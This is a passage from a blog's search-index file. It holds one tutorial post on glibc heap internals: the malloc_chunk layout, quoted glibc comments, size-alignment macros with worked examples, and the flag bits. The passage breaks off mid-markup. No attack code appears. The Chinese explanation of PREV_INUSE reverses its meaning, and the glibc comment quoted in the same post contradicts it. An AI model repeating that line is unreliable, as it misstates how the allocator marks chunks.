<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Basic Heap</title>
    <link href="/2022/10/20/Heap/"/>
    <url>/2022/10/20/Heap/</url>
    
    <content type="html"><![CDATA[<h1 id="Basic-Heap"><a href="#Basic-Heap" class="headerlink" title="Basic Heap"></a>Basic Heap</h1><h2 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment">x64 -&gt; 8</span><br><span class="hljs-comment">x86 -&gt; 4</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INTERNAL_SIZE_T size_t</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_SZ                (sizeof(INTERNAL_SIZE_T))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="hljs-comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="hljs-comment">  fields at known offsets from a given base. See explanation below.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>    INTERNAL_SIZE_T prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>    INTERNAL_SIZE_T size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">bk</span>;</span><br><br>    <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mbinptr</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mchunkptr</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br></code></pre></td></tr></table></figure><ul><li>prev_size ：如果上一个chunk处于释放状态，用于表示其大小</li><li>size：表示当前 chunk 的大小</li><li>fd, bk：仅在当前chunk被释放时有效，用来表示链表中的上一个chunk及下一个chunk</li><li>fd_nextsize，bk_nextsize：仅在当前chunk被释放时有效，用来表示链表中的上一个不同大小的chunk及下一个不同大小的chunk</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   malloc_chunk details:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    (The following includes lightly edited explanations by Colin Plumb.)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Chunks of memory are maintained using a `boundary tag&#x27; method as</span><br><span class="hljs-comment">    described in e.g., Knuth or Standish.  (See the paper by Paul</span><br><span class="hljs-comment">    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a</span><br><span class="hljs-comment">    survey of such techniques.)  Sizes of free chunks are stored both</span><br><span class="hljs-comment">    in the front of each chunk and at the end.  This makes</span><br><span class="hljs-comment">    consolidating fragmented chunks into bigger chunks very fast.  The</span><br><span class="hljs-comment">    size fields also hold bits representing whether chunks are free or</span><br><span class="hljs-comment">    in use.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    An allocated chunk looks like this:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="hljs-comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="hljs-comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    |             User data starts here...                          .</span><br><span class="hljs-comment">    .                                                               .</span><br><span class="hljs-comment">    .             (malloc_usable_size() bytes)                      .</span><br><span class="hljs-comment">    .                                                               |</span><br><span class="hljs-comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    |             (size of chunk, but used for application data)    |</span><br><span class="hljs-comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="hljs-comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of</span><br><span class="hljs-comment">    the malloc code, but &quot;mem&quot; is the pointer that is returned to the</span><br><span class="hljs-comment">    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Chunks always begin on even word boundaries, so the mem portion</span><br><span class="hljs-comment">    (which is returned to the user) is also on an even word boundary, and</span><br><span class="hljs-comment">    thus at least double-word aligned.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Free chunks are stored in circular doubly-linked lists, and look like this:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="hljs-comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    `head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="hljs-comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    |             Forward pointer to next chunk in list             |</span><br><span class="hljs-comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    |             Back pointer to previous chunk in list            |</span><br><span class="hljs-comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    |             Unused space (may be 0 bytes long)                .</span><br><span class="hljs-comment">    .                                                               .</span><br><span class="hljs-comment">    .                                                               |</span><br><span class="hljs-comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    `foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="hljs-comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="hljs-comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The P (PREV_INUSE) bit, stored in the unused low-order bit of the</span><br><span class="hljs-comment">    chunk size (which is always a multiple of two words), is an in-use</span><br><span class="hljs-comment">    bit for the *previous* chunk.  If that bit is *clear*, then the</span><br><span class="hljs-comment">    word before the current chunk size contains the previous chunk</span><br><span class="hljs-comment">    size, and can be used to find the front of the previous chunk.</span><br><span class="hljs-comment">    The very first chunk allocated always has this bit set,</span><br><span class="hljs-comment">    preventing access to non-existent (or non-owned) memory. If</span><br><span class="hljs-comment">    prev_inuse is set for any given chunk, then you CANNOT determine</span><br><span class="hljs-comment">    the size of the previous chunk, and might even get a memory</span><br><span class="hljs-comment">    addressing fault when trying to do so.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The A (NON_MAIN_ARENA) bit is cleared for chunks on the initial,</span><br><span class="hljs-comment">    main arena, described by the main_arena variable.  When additional</span><br><span class="hljs-comment">    threads are spawned, each thread receives its own arena (up to a</span><br><span class="hljs-comment">    configurable limit, after which arenas are reused for multiple</span><br><span class="hljs-comment">    threads), and the chunks in these arenas have the A bit set.  To</span><br><span class="hljs-comment">    find the arena for a chunk on such a non-main arena, heap_for_ptr</span><br><span class="hljs-comment">    performs a bit mask operation and indirection through the ar_ptr</span><br><span class="hljs-comment">    member of the per-heap header heap_info (see arena.c).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Note that the `foot&#x27; of the current chunk is actually represented</span><br><span class="hljs-comment">    as the prev_size of the NEXT chunk. This makes it easier to</span><br><span class="hljs-comment">    deal with alignments etc but can be very confusing when trying</span><br><span class="hljs-comment">    to extend or adapt this code.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The three exceptions to all this are:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     1. The special chunk `top&#x27; doesn&#x27;t bother using the</span><br><span class="hljs-comment">trailing size field since there is no next contiguous chunk</span><br><span class="hljs-comment">that would have to index off it. After initialization, `top&#x27;</span><br><span class="hljs-comment">is forced to always exist.  If it would become less than</span><br><span class="hljs-comment">MINSIZE bytes long, it is replenished.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span><br><span class="hljs-comment">bit M (IS_MMAPPED) set in their size fields.  Because they are</span><br><span class="hljs-comment">allocated one-by-one, each must contain its own trailing size</span><br><span class="hljs-comment">field.  If the M bit is set, the other bits are ignored</span><br><span class="hljs-comment">(because mmapped chunks are neither in an arena, nor adjacent</span><br><span class="hljs-comment">to a freed chunk).  The M bit is also used for chunks which</span><br><span class="hljs-comment">originally came from a dumped heap via malloc_set_state in</span><br><span class="hljs-comment">hooks.c.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     3. Chunks in fastbins are treated as allocated chunks from the</span><br><span class="hljs-comment">point of view of the chunk allocator.  They are consolidated</span><br><span class="hljs-comment">with their neighbors only in bulk, in malloc_consolidate.</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="size-dependent"><a href="#size-dependent" class="headerlink" title="size dependent"></a>size dependent</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The smallest possible chunk */</span><br><span class="hljs-comment">// 最小的 chunk 大小</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br><span class="hljs-comment">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MINSIZE  \</span><br><span class="hljs-meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">MIN_CHUNK_SIZE -&gt; 0x20</span><br><span class="hljs-comment">0000 0000 0000 0000 0000 0000 0010 0000</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MALLOC_ALIGN_MASK -&gt; 0xf</span><br><span class="hljs-comment">0000 0000 0000 0000 0000 0000 0000 1111</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">~MALLOC_ALIGN_MASK -&gt; -0x10</span><br><span class="hljs-comment">1111 1111 1111 1111 1111 1111 1111 0000</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK</span><br><span class="hljs-comment">0000 0000 0000 0000 0000 0000 0010 1111</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">(MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK</span><br><span class="hljs-comment">1111 1111 1111 1111 1111 1111 1111 0000</span><br><span class="hljs-comment">0000 0000 0000 0000 0000 0000 0010 1111</span><br><span class="hljs-comment">0000 0000 0000 0000 0000 0000 0010 0000  -&gt; 0x20</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// 计算请求的大小</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                         \</span><br><span class="hljs-meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="hljs-meta">   MINSIZE :                                                      \</span><br><span class="hljs-meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>) -&gt; <span class="hljs-number">0x20</span>;<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x21</span>) -&gt; <span class="hljs-number">0x30</span><br>    <span class="hljs-number">0x21</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xf</span> = <span class="hljs-number">0x38</span><br>    <span class="hljs-number">0011</span> <span class="hljs-number">1000</span><br>    <span class="hljs-number">1111</span> <span class="hljs-number">0000</span><br>    <span class="hljs-number">0011</span> <span class="hljs-number">0000</span> = <span class="hljs-number">0x30</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>) -&gt; <span class="hljs-number">0x30</span><br>    <span class="hljs-number">0x28</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xf</span> = <span class="hljs-number">0x3f</span><br>    <span class="hljs-number">0011</span> <span class="hljs-number">1111</span><br>    <span class="hljs-number">1111</span> <span class="hljs-number">0000</span><br>    <span class="hljs-number">0011</span> <span class="hljs-number">0000</span> = <span class="hljs-number">0x30</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x29</span>) -&gt; <span class="hljs-number">0x40</span><br>    <span class="hljs-number">0x29</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xf</span> = <span class="hljs-number">0x40</span><br>    <span class="hljs-number">0100</span> <span class="hljs-number">0000</span><br>    <span class="hljs-number">1111</span> <span class="hljs-number">0000</span><br>    <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> = <span class="hljs-number">0x40</span><br><br><span class="hljs-number">0x19</span> ~ <span class="hljs-number">0x28</span>  -&gt;  <span class="hljs-number">0x30</span><br><span class="hljs-number">0x29</span> ~ <span class="hljs-number">0x38</span>  -&gt;  <span class="hljs-number">0x40</span><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">补码：1111</span> <span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">0000</span><br><span class="hljs-string">反码：1111</span> <span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1110 </span><span class="hljs-number">1111</span><br><span class="hljs-string">原码：1000</span> <span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0001 </span><span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure><p>在 size 字段中由于 <code>&amp; ~MALLOC_ALIGN_MASK</code>,我们会发现它的后四个比特位一直为0，其中后3个比特位被用作标识，从高到低分别意味着</p><ul><li>NON_MAIN_ARENA：记录当前 chunk 是否不属于主线程</li><li>IS_MMAPPED：用于标识一个chunk是否是从mmap()函数中获得的。如果用户申请一个相当大的内存，malloc会通过 mmap()函数分配一个映射段。</li><li>PREV_INUSE：用于标识上一个chunk的状态。当它为1 时，表示上一个chunk处于释放状态，否则表示上一个chunk处于使用状态。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREV_INUSE 0x1</span><br><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span><br><br><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_MMAPPED 0x2</span><br><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span><br><br><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><br><span class="hljs-comment">/* Check for chunk from main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span><br><br><span class="hljs-comment">/* Mark a chunk as not being on the main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Bits to mask off when extracting size</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span><br><span class="hljs-comment">   macros for which mmapped chunks should never be seen. This should</span><br><span class="hljs-comment">   cause helpful core dumps to occur if it is tried by accident by</span><br><span class="hljs-comment">   people extending or adapting this malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span><br><br><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* Set the size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span><br><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><br><span class="hljs-comment">/* extract p&#x27;s inuse bit */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)                                  \</span><br><span class="hljs-meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><br><span class="hljs-comment">/* set/clear chunk as being inuse without otherwise disturbing */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_inuse(p)                                  \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_inuse(p)                                  \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br><br><br><span class="hljs-comment">/* check/set/clear inuse bits in known places */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse_bit_at_offset(p, s)                          \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_inuse_bit_at_offset(p, s)                          \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_inuse_bit_at_offset(p, s)                          \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br><br><br><span class="hljs-comment">/* Set size at head, without disturbing its use bit */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span><br><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br><br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20221018115053387.png" alt="image-20221018115053387"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 